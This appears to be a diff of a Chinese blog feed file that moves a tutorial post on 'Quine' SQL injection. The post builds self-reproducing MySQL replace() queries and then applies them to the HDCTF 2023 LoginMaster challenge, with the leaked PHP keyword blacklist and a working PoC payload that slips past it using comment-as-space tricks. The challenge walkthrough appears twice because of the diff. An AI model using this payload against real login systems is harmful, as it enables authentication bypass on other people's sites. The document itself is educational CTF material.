-<h4 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h4><h4 id="HDCTF-2023-LoginMaster"><a href="#HDCTF-2023-LoginMaster" class="headerlink" title="[HDCTF 2023]LoginMaster"></a>[HDCTF 2023]LoginMaster</h4><p>访问<code>robots.txt</code>，发现部分源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>我们可以发现关键代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>构造poc：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
     <title>羊城杯Serpent</title>
     <url>/category/%E7%BE%8A%E5%9F%8E%E6%9D%AFSerpent/</url>
     <content><![CDATA[<p>一共大概分作三步。</p>
@@ -961,6 +965,44 @@ $argv,$argc在web模式下不适用
       <tags>
         <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>学习Quino注入</title>
+    <url>/category/%E5%AD%A6%E4%B9%A0Quino%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h4 id="什么是Quine"><a href="#什么是Quine" class="headerlink" title="什么是Quine"></a>什么是Quine</h4><p><code>Quine</code>又称为自产生程序，<code>Quine注入</code>就是使用输入的SQL语句和输出的SQL相一致的技术，让查询语句的结果与输入语句相同来达到判断成功的效果。</p>
+<h4 id="replace函数"><a href="#replace函数" class="headerlink" title="replace函数"></a>replace函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">replace(object,search,replace)</span><br><span class="line">#object是原字符串，search是要替换的子串，replace是替换完后的子串</span><br></pre></td></tr></table></figure>
+
+<p>例如:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> replace(&quot;dragonkeep&quot;,<span class="type">char</span>(<span class="number">100</span>),<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(&quot;dragonkeep&quot;,<span class="type">char</span>(<span class="number">100</span>),<span class="string">&#x27;D&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Dragonkeep                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>这里成功将字符<code>d</code>替换为<code>D</code>。</p>
+<h4 id="嵌套使用一下"><a href="#嵌套使用一下" class="headerlink" title="嵌套使用一下"></a>嵌套使用一下</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>是不是傻了，有点像学完<code>1+1</code>就得会高数了(bushi)…</p>
+<p>简单剖析一下</p>
+<p>最外层执行<code>REPLACE</code>后，就变成：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>不难发现最后的引号是双引号，跟原来的单引号不一致。目的只有一个就是让原语句跟输出语句一致。</p>
+<h4 id="解决引号的问题"><a href="#解决引号的问题" class="headerlink" title="解决引号的问题"></a>解决引号的问题</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(<span class="string">&#x27;&quot;.&quot;&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>))</span><br></pre></td></tr></table></figure>
+
+<p>套上去后：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看上去很长，其实就是递归思想，拆解一下就好理解</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>此时可以发现输入与输出保持一致了。这里的<code>char</code>函数和<code>0x、chr三个等价</code>替换。</p>
+<h4 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h4><h4 id="HDCTF-2023-LoginMaster"><a href="#HDCTF-2023-LoginMaster" class="headerlink" title="[HDCTF 2023]LoginMaster"></a>[HDCTF 2023]LoginMaster</h4><p>访问<code>robots.txt</code>，发现部分源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现关键代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造poc：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title>谁偷吃了我的外卖WP</title>
